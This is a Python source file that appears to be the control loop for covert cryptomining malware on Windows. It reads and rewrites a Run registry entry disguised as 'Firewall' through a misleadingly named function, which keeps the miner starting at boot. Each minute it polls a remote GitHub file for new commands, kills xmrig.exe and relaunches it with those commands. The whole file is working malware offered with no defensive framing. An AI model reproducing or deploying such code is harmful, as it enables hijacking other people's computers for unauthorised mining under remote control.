import requests,_winreg,time,re,shlex,subprocess
from _winreg import *

def getMDACversion():
    
    # Open the key and return the handle object.
    hKey = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 
                          "Software\\Microsoft\\Windows\CurrentVersion\\Run")
                          
    # Read the value.                      
    result = _winreg.QueryValueEx(hKey, "Firewall")

    # Close the handle object.
    _winreg.CloseKey(hKey)

    # Return only the value from the resulting tuple (value, type_as_int).
    return result[0]
string1=str(getMDACversion())
directory=string1[:string1.index(" -o")]
maindir=string1[:string1.index("\\xmrig.exe")]
maindir=str(maindir)
directory1=str(directory)
def write(cmd):
    botdir=directory1+' '+cmd
    keyVal=r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    try:
        key =OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
    except:    
        key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
    SetValueEx(key, "Firewall", 0, REG_SZ, botdir)
    CloseKey(key)
    
while True:
    string=str(getMDACversion())
    old=string.split('xmrig.exe ',1)[1]
    page = requests.get('https://raw.githubusercontent.com/anonmarx/moneta/master/command.txt')
    new=str(page.text)
    new1=new.replace('\n', '')
    if old == new1:
        pass
    elif old != new1:
        line='cmd /c taskkill /im xmrig.exe /f'
        args = shlex.split(line)
        process=subprocess.Popen(args,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
        line='cmd /c xmrig.exe '+new1
        args = shlex.split(line)
        process=subprocess.Popen(args,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,cwd=maindir,shell=True)
        write(new1)
    time.sleep(60)
